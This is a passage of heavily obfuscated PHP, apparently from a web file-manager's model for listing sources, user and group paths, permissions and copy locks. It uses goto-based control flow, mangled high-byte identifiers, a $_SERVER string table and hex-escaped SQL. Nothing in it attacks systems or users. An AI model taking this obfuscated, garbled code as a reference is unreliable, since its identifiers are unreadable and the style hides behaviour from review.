array(); } $D³ƒŸ åĞÁ[$bŞÒŞÙ‚[$F‰Ş¦°ƒ£«[415]]][$bŞÒŞÙ‚[$F‰Ş¦°ƒ£«[88]]] = $bŞÒŞÙ‚[$F‰Ş¦°ƒ£«[354]]; } goto d¾˜Ä¬íì; B—¸®à‡Õ: $C˜Ï‰à£‘† = Model($F‰Ş¦°ƒ£«[418])->field($f®ËË‹óï«)->where($B—ßëÉ¤“Ş)->select(); $C˜Ï‰à£‘† = array_to_keyvalue($C˜Ï‰à£‘†, $F‰Ş¦°ƒ£«[415]); $eŸ¤Ø¬« = Model($F‰Ş¦°ƒ£«[419])->field($F‰Ş¦°ƒ£«[420])->where($B—ßëÉ¤“Ş)->select(); goto Bõ²²· «Î; DÜâ ø’Íõ: $F‰Ş¦°ƒ£« =& $_SERVER[¿õñ]; $A‰¦Ôœà¨× = array_to_keyvalue($eç…—›°é‘, $F‰Ş¦°ƒ£«[33], $F‰Ş¦°ƒ£«[415]); $A‰¦Ôœà¨× = array_filter(array_unique($A‰¦Ôœà¨×)); goto FÛŸ‰¯„; d¾˜Ä¬íì: foreach ($eç…—›°é‘ as &$eóÏÉ†¹©) { goto B¤Üæ¦¬‰Ì; Cæ˜¯ãÍËÆ: $c¯ÜÛ°ºĞì[$F‰Ş¦°ƒ£«[78]] = $eóÏÉ†¹©[$F‰Ş¦°ƒ£«[78]]; $c¯ÜÛ°ºĞì[$F‰Ş¦°ƒ£«[28]] = $eóÏÉ†¹©[$F‰Ş¦°ƒ£«[28]]; self::$cacheFileInfo[$F‰Ş¦°ƒ£«[421] . $d·÷ŞÂ·ÂÃ] = $c¯ÜÛ°ºĞì; goto A—ÑŒàÊò¼; B¤Üæ¦¬‰Ì: $d·÷ŞÂ·ÂÃ = $eóÏÉ†¹©[$F‰Ş¦°ƒ£«[415]]; if (!$d·÷ŞÂ·ÂÃ || !isset($C˜Ï‰à£‘†[$d·÷ŞÂ·ÂÃ])) { continue; } $c¯ÜÛ°ºĞì = $C˜Ï‰à£‘†[$d·÷ŞÂ·ÂÃ]; goto Cæ˜¯ãÍËÆ; A—ÑŒàÊò¼: unset($C˜Ï‰à£‘†[$d·÷ŞÂ·ÂÃ][$F‰Ş¦°ƒ£«[76]]); $c»÷¦î”Ş‰ = is_array($D³ƒŸ åĞÁ[$d·÷ŞÂ·ÂÃ]) ? $D³ƒŸ åĞÁ[$d·÷ŞÂ·ÂÃ] : array(); $eóÏÉ†¹©[$F‰Ş¦°ƒ£«[159]] = array_merge($c»÷¦î”Ş‰, $C˜Ï‰à£‘†[$d·÷ŞÂ·ÂÃ]); goto aÛ³Ô°Ã›; aÛ³Ô°Ã›: if (isset($eóÏÉ†¹©[$F‰Ş¦°ƒ£«[159]][$F‰Ş¦°ƒ£«[422]])) { $eóÏÉ†¹©[$F‰Ş¦°ƒ£«[422]] = json_decode($eóÏÉ†¹©[$F‰Ş¦°ƒ£«[159]][$F‰Ş¦°ƒ£«[422]], !0); unset($eóÏÉ†¹©[$F‰Ş¦°ƒ£«[159]][$F‰Ş¦°ƒ£«[422]]); } goto C‡¦é’Ú¾£; C‡¦é’Ú¾£: } goto AÚÆ¹ö¿ÏÁ; FÛŸ‰¯„: if (!$A‰¦Ôœà¨×) { return; } $B—ßëÉ¤“Ş = array($F‰Ş¦°ƒ£«[416] => array($F‰Ş¦°ƒ£«[381], $A‰¦Ôœà¨×)); $f®ËË‹óï« = $F‰Ş¦°ƒ£«[417]; goto B—¸®à‡Õ; AÚÆ¹ö¿ÏÁ: } protected function _listAppendSourceInfo(&$c¬ë›âõ¡, $b¶¯†ŠâÔ) { goto dİ—Šëğ§; fù¦ŞßÅÅÖ: $C„œäÇÌ°Ø = array_to_keyvalue($bßÀÕç‘Ò‰, $d­¶õÛÔ[364]); $b¾ÎÄ¸Ôîñ = array_to_keyvalue_group($BåéŠÓšÇ‰, $d­¶õÛÔ[76], $d­¶õÛÔ[390]); $DäÓİÍ = array_to_keyvalue($d†·›ĞÅ©Œ, $d­¶õÛÔ[76]); goto FõæóñÕÍ; FõæóñÕÍ: $eİ˜°Ğ»„Ş = array_to_keyvalue_group($B„ëªªË¡Í, $d­¶õÛÔ[366]); foreach ($c¬ë›âõ¡ as &$b³¹šâ…Â) { $b³¹šâ…Â[$d­¶õÛÔ[388]] = array($d­¶õÛÔ[426] => 0, $d­¶õÛÔ[427] => 0, $d­¶õÛÔ[428] => 0); if (isset($DäÓİÍ[$b³¹šâ…Â[$d­¶õÛÔ[366]]])) { $b³¹šâ…Â[$d­¶õÛÔ[388]][$d­¶õÛÔ[429]] = 1; $b³¹šâ…Â[$d­¶õÛÔ[388]][$d­¶õÛÔ[430]] = $DäÓİÍ[$b³¹šâ…Â[$d­¶õÛÔ[366]]][$d­¶õÛÔ[28]]; } if (isset($b¾ÎÄ¸Ôîñ[$b³¹šâ…Â[$d­¶õÛÔ[366]]])) { $b³¹šâ…Â[$d­¶õÛÔ[388]][$d­¶õÛÔ[431]] = array(); foreach ($b¾ÎÄ¸Ôîñ[$b³¹šâ…Â[$d­¶õÛÔ[366]]] as $E±…ê÷‡«Ù) { $F´ÈÈ»È¼· = $C„œäÇÌ°Ø[$E±…ê÷‡«Ù]; $b³¹šâ…Â[$d­¶õÛÔ[388]][$d­¶õÛÔ[431]][] = array($d­¶õÛÔ[432] => $F´ÈÈ»È¼·[$d­¶õÛÔ[364]], $d­¶õÛÔ[383] => $F´ÈÈ»È¼·[$d­¶õÛÔ[28]], $d­¶õÛÔ[433] => $F´ÈÈ»È¼·[$d­¶õÛÔ[434]]); } } if (isset($eİ˜°Ğ»„Ş[$b³¹šâ…Â[$d­¶õÛÔ[366]]])) { $b³¹šâ…Â[$d­¶õÛÔ[388]][$d­¶õÛÔ[435]] = array(); foreach ($eİ˜°Ğ»„Ş[$b³¹šâ…Â[$d­¶õÛÔ[366]]] as $B¥´Ö¡é¶«) { $b³¹šâ…Â[$d­¶õÛÔ[388]][$d­¶õÛÔ[435]] = array($d­¶õÛÔ[436] => $B¥´Ö¡é¶«[$d­¶õÛÔ[437]], $d­¶õÛÔ[438] => $B¥´Ö¡é¶«[$d­¶õÛÔ[439]], $d­¶õÛÔ[440] => $B¥´Ö¡é¶«[$d­¶õÛÔ[366]], $d­¶õÛÔ[441] => $B¥´Ö¡é¶«[$d­¶õÛÔ[442]], $d­¶õÛÔ[443] => $B¥´Ö¡é¶«[$d­¶õÛÔ[444]]); } } } return $c¬ë›âõ¡; goto BÒ”ŒÙ™£Ğ; dİ—Šëğ§: $d­¶õÛÔ =& $_SERVER[¿õñ]; if (!defined($d­¶õÛÔ[423])) { return; } $bßÀÕç‘Ò‰ = Model($d­¶õÛÔ[424])->listData(); goto b–àå¦±Ø¡; b–àå¦±Ø¡: $BåéŠÓšÇ‰ = Model($d­¶õÛÔ[389])->listData(); $d†·›ĞÅ©Œ = Model($d­¶õÛÔ[378])->listData(); $B„ëªªË¡Í = Model($d­¶õÛÔ[425])->listSimple(); goto fù¦ŞßÅÅÖ; BÒ”ŒÙ™£Ğ: } protected function _listAppendChildren(&$b¢×É¸İÁ¾, $Fó‰ÆÒ—ùõ) { goto D¨œÁÉˆÆ¥; D¨œÁÉˆÆ¥: $b¡®È¬Ì© =& $_SERVER[¿õñ]; $Eµéº¡¬ï = $b¡®È¬Ì©[358]; $fÍ¿Ÿ›®Ï = array(); goto D®³ˆñ‚‘ò; cÓÚ¶ƒÖº: for ($dòğ¢¿œ¤Í = 0; $dòğ¢¿œ¤Í < $bœ§Œˆ³Åé; $dòğ¢¿œ¤Í++) { if ($b¢×É¸İÁ¾[$dòğ¢¿œ¤Í][$b¡®È¬Ì©[367]]) { $FæÎ¬Ÿœˆ = $b¢×É¸İÁ¾[$dòğ¢¿œ¤Í][$b¡®È¬Ì©[366]]; $Eµéº¡¬ï .= "\x53\x45\x4c\105\103\124\x20\x2a\x20\x46\122\117\115\x20\x28\x53\x45\x4c\105\x43\124\40\x27{$FæÎ¬Ÿœˆ}\x5f\150\x61\x73\x46\x69\x6c\x65\x27\40\141\163\40\150\x61\163\x2c\x63\157\x75\x6e\164\x28\61\51\40\x61\x73\x20\150\x61\163\103\157\x75\x6e\x74\40\106\122\x4f\x4d\40\140{$CÆª†Ğìå}\x60\40\xa\11\x9\x9\11\11\x77\x68\x65\162\x65\40\160\x61\x72\145\x6e\x74\x49\104\75{$FæÎ¬Ÿœˆ}\40\x61\x6e\x64\x20\x69\163\106\157\154\144\x65\x72\x3d\x30\40\141\x6e\144\40\x69\x73\104\145\x6c\x65\164\x65\x3d\x30\x29\x20\141\x73\40\x74\x62\61\137{$FæÎ¬Ÿœˆ}\40\165\156\x69\157\156\x20\141\154\154\x20\xa\x9\x9\x9\x9\x9\x53\105\x4c\x45\x43\x54\x20\52\40\106\x52\117\115\x20\x28\123\105\x4c\x45\x43\x54\x20\47{$FæÎ¬Ÿœˆ}\137\x68\x61\163\x46\x6f\x6c\x64\145\162\x27\40\x61\x73\x20\150\x61\163\106\x69\154\145\x2c\x63\x6f\x75\x6e\x74\50\x31\x29\40\x61\163\x20\150\x61\163\x43\157\x75\156\164\40\106\x52\x4f\115\40\140{$CÆª†Ğìå}\140\x20\12\11\11\11\x9\11\x77\150\x65\162\145\40\x70\x61\162\x65\x6e\x74\111\104\75{$FæÎ¬Ÿœˆ}\40\141\x6e\144\x20\x69\x73\x46\x6f\154\x64\145\x72\75\61\40\141\x6e\144\x20\x69\163\104\x65\154\x65\x74\145\x3d\60\51\x20\x61\x73\x20\164\142\62\137{$FæÎ¬Ÿœˆ}\x20\x75\x6e\x69\157\156\x20\141\154\x6c\x20"; } if ((strlen($Eµéº¡¬ï) >= $e›ÄÚÌ¦„• || $dòğ¢¿œ¤Í == $bœ§Œˆ³Åé - 1) && $Eµéº¡¬ï) { $Eµéº¡¬ï = substr($Eµéº¡¬ï, 0, -strlen($b¡®È¬Ì©[445])); $e„³æÄÁÇ× = $this->query($Eµéº¡¬ï); $fÍ¿Ÿ›®Ï = array_merge($fÍ¿Ÿ›®Ï, $e„³æÄÁÇ×); $Eµéº¡¬ï = $b¡®È¬Ì©[33]; } } $fÍ¿Ÿ›®Ï = array_to_keyvalue($fÍ¿Ÿ›®Ï, $b¡®È¬Ì©[446]); foreach ($b¢×É¸İÁ¾ as &$cÕÔÍ¦ñƒ˜) { if ($cÕÔÍ¦ñƒ˜[$b¡®È¬Ì©[367]]) { unset($cÕÔÍ¦ñƒ˜[$b¡®È¬Ì©[369]]); $cÕÔÍ¦ñƒ˜[$b¡®È¬Ì©[189]] = intval($fÍ¿Ÿ›®Ï[$cÕÔÍ¦ñƒ˜[$b¡®È¬Ì©[366]] . $b¡®È¬Ì©[447]][$b¡®È¬Ì©[448]]); $cÕÔÍ¦ñƒ˜[$b¡®È¬Ì©[188]] = intval($fÍ¿Ÿ›®Ï[$cÕÔÍ¦ñƒ˜[$b¡®È¬Ì©[366]] . $b¡®È¬Ì©[449]][$b¡®È¬Ì©[448]]); } } goto AŒ®íƒ‘¾Ã; D®³ˆñ‚‘ò: $e›ÄÚÌ¦„• = 1024 * 50; $bœ§Œˆ³Åé = count($b¢×É¸İÁ¾); $CÆª†Ğìå = $this->tablePrefix . $this->tableName; goto cÓÚ¶ƒÖº; AŒ®íƒ‘¾Ã: } protected function _listAppendAuth(&$AÜºä‘ÆÄ‹) { goto D‘Ş·ã”êñ; Dâé»­°Š¯: foreach ($AÜºä‘ÆÄ‹ as $B‰ÙªØÙ…à) { if ($B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[368]] == self::TYPE_GROUP) { $B…ç‡„ñ•[] = $B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[366]]; } } if (!$B…ç‡„ñ•) { return; } $d‡Ş£¥à¶ = array_to_keyvalue($AÜºä‘ÆÄ‹, $bÙ‰Æ…ªåÚ[366]); goto bÀ¦Ñö£é; bÀ¦Ñö£é: $eñ—‚–´õ’ = Model($bÙ‰Æ…ªåÚ[450])->getSourceList($B…ç‡„ñ•, $d‡Ş£¥à¶); foreach ($AÜºä‘ÆÄ‹ as $C®®³óÒßØ => &$B‰ÙªØÙ…à) { $B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[373]] = $eñ—‚–´õ’[$B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[366]]]; if (!$B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[373]] && $B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[368]] == self::TYPE_GROUP) { $B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[373]] = Action($bÙ‰Æ…ªåÚ[451])->pathGroupAuthMake($B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[452]]); if (!$B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[373]] && !$GLOBALS[$bÙ‰Æ…ªåÚ[453]]) { $B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[186]] = !1; $B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[185]] = !1; } } if ($B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[373]]) { $B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[186]] = AuthModel::authCheckEdit($B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[373]][$bÙ‰Æ…ªåÚ[374]]); $B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[185]] = AuthModel::authCheckView($B‰ÙªØÙ…à[$bÙ‰Æ…ªåÚ[373]][$bÙ‰Æ…ªåÚ[374]]); } $this->groupPathDisplay($B‰ÙªØÙ…à); } goto b£‚‹«ãÎ; D‘Ş·ã”êñ: $bÙ‰Æ…ªåÚ =& $_SERVER[¿õñ]; if (!defined($bÙ‰Æ…ªåÚ[423])) { return; } $B…ç‡„ñ• = array(); goto Dâé»­°Š¯; b£‚‹«ãÎ: } public function groupPathDisplay(&$c§ïÒòğÄ×) { goto dªä—°ÂÂ²; dªä—°ÂÂ²: $F¤àåˆŠÂ¨ =& $_SERVER[¿õñ]; if ($c§ïÒòğÄ×[$F¤àåˆŠÂ¨[368]] != self::TYPE_GROUP) { return; } $Añœš°äÃ‚ = Model($F¤àåˆŠÂ¨[454])->getInfo($c§ïÒòğÄ×[$F¤àåˆŠÂ¨[452]]); goto fç˜ ˆ´ô•; c›’ÅÙÌ–î: $c§ïÒòğÄ×[$F¤àåˆŠÂ¨[456]] = $Añœš°äÃ‚[$F¤àåˆŠÂ¨[457]]; $c§ïÒòğÄ×[$F¤àåˆŠÂ¨[377]] = $Añœš°äÃ‚[$F¤àåˆŠÂ¨[455]]; $c§ïÒòğÄ×[$F¤àåˆŠÂ¨[458]] = $Añœš°äÃ‚[$F¤àåˆŠÂ¨[459]]; goto f«§¶…Ï§; fç˜ ˆ´ô•: $E–Öá”êË = $this->parentLevelArray($Añœš°äÃ‚[$F¤àåˆŠÂ¨[455]]); $EÌõÀ¾×Ûè = $F¤àåˆŠÂ¨[33]; foreach ($E–Öá”êË as $FíèÚä½×–) { $EÓ¡Öµ‘ç = Model($F¤àåˆŠÂ¨[454])->getInfo($FíèÚä½×–); $EÌõÀ¾×Ûè .= $EÓ¡Öµ‘ç[$F¤àåˆŠÂ¨[388]][$F¤àåˆŠÂ¨[366]] . $F¤àåˆŠÂ¨[47]; } goto c›’ÅÙÌ–î; f«§¶…Ï§: $c§ïÒòğÄ×[$F¤àåˆŠÂ¨[460]] = $EÌõÀ¾×Ûè . $Añœš°äÃ‚[$F¤àåˆŠÂ¨[388]][$F¤àåˆŠÂ¨[366]]; goto FŞĞäïÉ“; FŞĞäïÉ“: } protected function _listAppendPath(&$B†ù½ÔÓ˜Ç) { goto fÖÂß»×à™; cÎÄ‰™²Ú: foreach ($B†ù½ÔÓ˜Ç as &$Eù¬è‚Ãğ) { goto FÒº¹Ø‰õ; FÒº¹Ø‰õ: $e ¶Æ†ñŞƒ = $this->parentLevelArray($Eù¬è‚Ãğ[$fÂà×Ì”¨[455]]); $D›¶†¸àÚ† = $this->_listAppendPathRoot($Eù¬è‚Ãğ, $e ¶Æ†ñŞƒ); foreach ($e ¶Æ†ñŞƒ as $céÉÊ§éñ±) { if (isset($CêˆÍ¢©Ñì[$céÉÊ§éñ±])) { $D›¶†¸àÚ† .= $CêˆÍ¢©Ñì[$céÉÊ§éñ±] . $fÂà×Ì”¨[8]; } } goto a²ÊÒãëÙ‘; a²ÊÒãëÙ‘: if ($e ¶Æ†ñŞƒ) { $D›¶†¸àÚ† .= $Eù¬è‚Ãğ[$fÂà×Ì”¨[28]]; } if ($Eù¬è‚Ãğ[$fÂà×Ì”¨[367]]) { $D›¶†¸àÚ† .= $fÂà×Ì”¨[8]; } $Eù¬è‚Ãğ[$fÂà×Ì”¨[462]] = str_replace($fÂà×Ì”¨[463], $fÂà×Ì”¨[8], $D›¶†¸àÚ†); goto f„¯‡Á¹Ú“; f„¯‡Á¹Ú“: $CƒÀƒ‰óè® = trim($Eù¬è‚Ãğ[$fÂà×Ì”¨[462]], $fÂà×Ì”¨[8]); if ($Eù¬è‚Ãğ[$fÂà×Ì”¨[457]] == $fÂà×Ì”¨[464] && $CƒÀƒ‰óè®) { $Eù¬è‚Ãğ[$fÂà×Ì”¨[28]] = $CƒÀƒ‰óè®; } goto fµË§Ë²Î®; fµË§Ë²Î®: } goto fâÔœñ…‹’; c©ğõÎ¼”: $bå«‰éõ„™ = array(); foreach ($CêˆÍ¢©Ñì as $F’’ôˆ‡¼ => $b¿æ‹‚™¹¥) { if (!$b¿æ‹‚™¹¥) { $bå«‰éõ„™[] = $F’’ôˆ‡¼; } } if ($bå«‰éõ„™) { $a‰ÇŒ¼Ãñ = array($fÂà×Ì”¨[380] => array($fÂà×Ì”¨[381], $bå«‰éõ„™)); if (count($bå«‰éõ„™) == 1) { $fÁË…òŸ = $this->sourceInfo($bå«‰éõ„™[0]); $fÁË…òŸ = is_array($fÁË…òŸ) ? array($fÁË…òŸ) : !1; } else { $fÁË…òŸ = $this->field($fÂà×Ì”¨[461])->where($a‰ÇŒ¼Ãñ)->select(); } $E‹³²¦¥æ = array_to_keyvalue($fÁË…òŸ, $fÂà×Ì”¨[366], $fÂà×Ì”¨[28]); $CêˆÍ¢©Ñì = array_merge_index($CêˆÍ¢©Ñì, $E‹³²¦¥æ); } goto cÎÄ‰™²Ú; fÖÂß»×à™: $fÂà×Ì”¨ =& $_SERVER[¿õñ]; $CêˆÍ¢©Ñì = array(); foreach ($B†ù½ÔÓ˜Ç as &$Eù¬è‚Ãğ) { $CêˆÍ¢©Ñì[$Eù¬è‚Ãğ[$fÂà×Ì”¨[366]]] = $Eù¬è‚Ãğ[$fÂà×Ì”¨[28]]; $e ¶Æ†ñŞƒ = $this->parentLevelArray($Eù¬è‚Ãğ[$fÂà×Ì”¨[455]]); array_shift($e ¶Æ†ñŞƒ); foreach ($e ¶Æ†ñŞƒ as $céÉÊ§éñ±) { if (!isset($CêˆÍ¢©Ñì[$céÉÊ§éñ±])) { $CêˆÍ¢©Ñì[$céÉÊ§éñ±] = 0; } } } goto c©ğõÎ¼”; fâÔœñ…‹’: } protected function _listAppendPathRoot(&$c¥¹éÉµª–, $D»è³¾ëÈĞ) { $f±§ÑÒµİ =& $_SERVER[¿õñ]; $a´Äë‡æò„ = $f±§ÑÒµİ[33]; if ($c¥¹éÉµª–[$f±§ÑÒµİ[368]] == self::TYPE_USER) { if ($c¥¹éÉµª–[$f±§ÑÒµİ[452]] == USER_ID) { $a´Äë‡æò„ = LNG($f±§ÑÒµİ[465]); if (!$D»è³¾ëÈĞ) { $c¥¹éÉµª–[$f±§ÑÒµİ[28]] = $a´Äë‡æò„; } } else { $fĞ‚¨êøŞ = Model($f±§ÑÒµİ[466])->getInfoSimple($c¥¹éÉµª–[$f±§ÑÒµİ[452]]); $a´Äë‡æò„ = LNG($f±§ÑÒµİ[467]) . $f±§ÑÒµİ[154] . $fĞ‚¨êøŞ[$f±§ÑÒµİ[28]] . $f±§ÑÒµİ[468]; } } else { if ($c¥¹éÉµª–[$f±§ÑÒµİ[368]] == self::TYPE_GROUP) { $fĞ‚¨êøŞ = Model($f±§ÑÒµİ[454])->getInfoSimple($c¥¹éÉµª–[$f±§ÑÒµİ[452]]); $a´Äë‡æò„ = $fĞ‚¨êøŞ[$f±§ÑÒµİ[28]]; } else { if ($c¥¹éÉµª–[$f±§ÑÒµİ[368]] == self::TYPE_SYSTEM) { $fĞ‚¨êøŞ = $this->sourceInfo($D»è³¾ëÈĞ[0], !0); $a´Äë‡æò„ = $fĞ‚¨êøŞ[$f±§ÑÒµİ[28]]; } } } $a´Äë‡æò„ = $a´Äë‡æò„ ? $f±§ÑÒµİ[8] . $a´Äë‡æò„ . $f±§ÑÒµİ[8] : $f±§ÑÒµİ[8]; return $a´Äë‡æò„; } protected function _listAppendUser(&$cÆô•çëËØ) { $b¿ÊÁÄ¨ƒÖ =& $_SERVER[¿õñ]; $d„È˜Ì™é’ = array_to_keyvalue($cÆô•çëËØ, $b¿ÊÁÄ¨ƒÖ[33], $b¿ÊÁÄ¨ƒÖ[375]); $CÉó•¨©œŠ = array_to_keyvalue($cÆô•çëËØ, $b¿ÊÁÄ¨ƒÖ[33], $b¿ÊÁÄ¨ƒÖ[376]); $Cìá™¼®à† = array_merge($d„È˜Ì™é’, $CÉó•¨©œŠ); $cŠ®¦Î²™¥ = Model($b¿ÊÁÄ¨ƒÖ[469])->userListInfo($Cìá™¼®à†); foreach ($cÆô•çëËØ as &$b°Û±¼¤³Ô) { $DÇŒ‘ã¦˜¥ = $b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[375]]; $b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[375]] = $cŠ®¦Î²™¥[$DÇŒ‘ã¦˜¥] ? $cŠ®¦Î²™¥[$DÇŒ‘ã¦˜¥] : !1; $DÇŒ‘ã¦˜¥ = $b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[376]]; $b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[376]] = $cŠ®¦Î²™¥[$DÇŒ‘ã¦˜¥] ? $cŠ®¦Î²™¥[$DÇŒ‘ã¦˜¥] : !1; if (isset($b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[413]]) && $b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[413]][$b¿ÊÁÄ¨ƒÖ[470]]) { $aøÆ‘²æ°‹ = $GLOBALS[$b¿ÊÁÄ¨ƒÖ[6]][$b¿ÊÁÄ¨ƒÖ[84]][$b¿ÊÁÄ¨ƒÖ[471]]; if ($b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[413]][$b¿ÊÁÄ¨ƒÖ[472]] <= time() - $aøÆ‘²æ°‹) { $this->metaSet($b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[366]], $b¿ÊÁÄ¨ƒÖ[470], null); $this->metaSet($b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[366]], $b¿ÊÁÄ¨ƒÖ[472], null); unset($b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[413]][$b¿ÊÁÄ¨ƒÖ[470]]); continue; } $DÃ‘İ‰öñæ = $b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[413]][$b¿ÊÁÄ¨ƒÖ[470]]; $b°Û±¼¤³Ô[$b¿ÊÁÄ¨ƒÖ[413]][$b¿ÊÁÄ¨ƒÖ[473]] = Model($b¿ÊÁÄ¨ƒÖ[469])->getInfoSimpleOuter($DÃ‘İ‰öñæ); } } } public function parentLevelArray($BËĞ¹–¬·) { $fÏ–è†ˆ² =& $_SERVER[¿õñ]; $BËĞ¹–¬· = explode($fÏ–è†ˆ²[47], trim($BËĞ¹–¬·, $fÏ–è†ˆ²[47])); return array_remove_value($BËĞ¹–¬·, $fÏ–è†ˆ²[464]); } public function listAll($aô±™²ƒùª) { goto dá¿¥ƒÀ; dá¿¥ƒÀ: $e±Ç¼Ü½¶Î =& $_SERVER[¿õñ]; $C´‘§‹ä—î = $this->sourceInfo($aô±™²ƒùª); $Ağ®Ç÷ß›Ø = array($e±Ç¼Ü½¶Î[474] => array($e±Ç¼Ü½¶Î[475], $C´‘§‹ä—î[$e±Ç¼Ü½¶Î[455]] . $aô±™²ƒùª . $e±Ç¼Ü½¶Î[476]), $e±Ç¼Ü½¶Î[477] => 0); goto aš‡…‹ôá‡; Fáá×ßÇÜ: $E©Â¥Î‡¨ = array_to_keyvalue($E©Â¥Î‡¨, $e±Ç¼Ü½¶Î[366]); $bİå»Ã¼“‰ = "\x2f{$C´‘§‹ä—î[$e±Ç¼Ü½¶Î[28]]}\57"; $bİå»Ã¼“‰ = $bİå»Ã¼“‰ == $e±Ç¼Ü½¶Î[463] ? $e±Ç¼Ü½¶Î[8] : $bİå»Ã¼“‰; goto E…ªõÑæŠ²; E…ªõÑæŠ²: $AÃ‹¦åë¬î = array(); foreach ($E©Â¥Î‡¨ as $bººÆ÷ÕÚ§ => $AÇ©Õ°„) { goto F™œ³£„ŞÈ; A¬Í¼¨”™¶: if (!$AÇ©Õ°„[$e±Ç¼Ü½¶Î[367]]) { $C‘–“ÚÊ«©[$e±Ç¼Ü½¶Î[415]] = $AÇ©Õ°„[$e±Ç¼Ü½¶Î[415]]; $C‘–“ÚÊ«©[$e±Ç¼Ü½¶Î[481]] = $AÇ©Õ°„[$e±Ç¼Ü½¶Î[76]]; } $AÃ‹¦åë¬î[] = $C‘–“ÚÊ«©; goto dà™À£¼é«; F™œ³£„ŞÈ: $F“¯¦—Üê® = $this->parentLevelArray($AÇ©Õ°„[$e±Ç¼Ü½¶Î[455]]); array_shift($F“¯¦—Üê®); $c‘ùæŠ‰ÔŠ = $bİå»Ã¼“‰; goto Fä¨±éÀˆ’; Fä¨±éÀˆ’: for ($B‘¹¨¡‡èö = 0; $B‘¹¨¡‡èö < count($F“¯¦—Üê®); $B‘¹¨¡‡èö++) { $c‘ùæŠ‰ÔŠ .= $E©Â¥Î‡¨[$F“¯¦—Üê®[$B‘¹¨¡‡èö]][$e±Ç¼Ü½¶Î[28]] . $e±Ç¼Ü½¶Î[8]; } $c‘ùæŠ‰ÔŠ .= $AÇ©Õ°„[$e±Ç¼Ü½¶Î[28]]; if ($AÇ©Õ°„[$e±Ç¼Ü½¶Î[367]]) { $c‘ùæŠ‰ÔŠ .= $e±Ç¼Ü½¶Î[8]; } goto FÏáĞÎÜ¡“; FÏáĞÎÜ¡“: $c‘ùæŠ‰ÔŠ = str_replace($e±Ç¼Ü½¶Î[463], $e±Ç¼Ü½¶Î[8], $c‘ùæŠ‰ÔŠ); $c‘ùæŠ‰ÔŠ = str_replace($e±Ç¼Ü½¶Î[463], $e±Ç¼Ü½¶Î[8], $c‘ùæŠ‰ÔŠ); $C‘–“ÚÊ«© = array($e±Ç¼Ü½¶Î[384] => str_replace($e±Ç¼Ü½¶Î[463], $e±Ç¼Ü½¶Î[8], $c‘ùæŠ‰ÔŠ), $e±Ç¼Ü½¶Î[480] => intval($AÇ©Õ°„[$e±Ç¼Ü½¶Î[367]]), $e±Ç¼Ü½¶Î[388] => $this->pathInfoFilter($AÇ©Õ°„, !0)); goto A¬Í¼¨”™¶; dà™À£¼é«: } return $AÃ‹¦åë¬î; goto b’™š§«ÀË; bµéÉÙ°: $this->_listAppendAuth($E©Â¥Î‡¨); $this->_listAppendUser($E©Â¥Î‡¨); $this->_listAppendPath($E©Â¥Î‡¨); goto Fáá×ßÇÜ; aš‡…‹ôá‡: $cÜ‡¾£ÛæÆ = $e±Ç¼Ü½¶Î[478]; $CìĞí½¯´ = "\114\105\x46\x54\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x69\157\x5f\x66\x69\x6c\145\40\146\151\154\145\x20\x6f\156\x20\163\157\x75\x72\143\x65\x2e\146\x69\154\x65\111\x44\40\x3d\40\146\151\154\x65\56\x66\x69\x6c\x65\111\x44"; $E©Â¥Î‡¨ = $this->alias($e±Ç¼Ü½¶Î[479])->field($cÜ‡¾£ÛæÆ)->where($Ağ®Ç÷ß›Ø)->join($CìĞí½¯´)->select(); goto bµéÉÙ°; b’™š§«ÀË: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($A¡¸ù“íÒ) { goto dù¨‚óÑ‘Å; BŞ¯» Öö÷: $this->_lockEvent($A¡¸ù“íÒ, array($d÷‹ÁÒØŠÛ[485], $d÷‹ÁÒØŠÛ[486]), $eë•Ú„¡ñ¹); $this->_lockCheckEnd($d÷‹ÁÒØŠÛ[482], $A¡¸ù“íÒ); goto A®›ì˜Œëï; Câ¹÷„²î‘: $eë•Ú„¡ñ¹ = 1; $this->_lockEvent($A¡¸ù“íÒ, array($d÷‹ÁÒØŠÛ[483], $d÷‹ÁÒØŠÛ[484]), $eë•Ú„¡ñ¹); $this->_lockParent($A¡¸ù“íÒ, array($d÷‹ÁÒØŠÛ[484]), $eë•Ú„¡ñ¹); goto BŞ¯» Öö÷; dù¨‚óÑ‘Å: $d÷‹ÁÒØŠÛ =& $_SERVER[¿õñ]; if (!$this->allowLock()) { return; } $this->_lockCheck($d÷‹ÁÒØŠÛ[482], $A¡¸ù“íÒ); goto Câ¹÷„²î‘; A®›ì˜Œëï: } public function lockCopyEnd($B­¸Ü‡ê®¡) { $B¬·©´›Ü =& $_SERVER[¿õñ]; if (!$this->allowLock()) { return; } $FšŒ‡’¦ ò = 0; $this->_lockEvent($B­¸Ü‡ê®¡, array($B¬·©´›Ü[483], $B¬·©´›Ü[484]), $FšŒ‡’¦ ò); $this->_lockParent($B­¸Ü‡ê®¡, array($B¬·©´›Ü[484]), 